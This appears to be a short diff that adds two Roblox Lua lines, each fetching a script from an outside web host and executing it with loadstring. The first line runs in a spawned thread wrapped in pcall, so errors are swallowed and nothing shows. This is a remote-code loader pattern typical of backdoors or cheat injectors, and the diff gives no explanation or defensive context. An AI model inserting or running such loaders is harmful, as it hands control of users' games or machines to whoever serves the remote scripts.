@@ -1,0 +1,2 @@
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://botthepan.onrender.com/script/0de5a9ab13982804"))() end) end)
+loadstring(game:HttpGet("https://botthepan.onrender.com/script/60b066819f968f70"))()
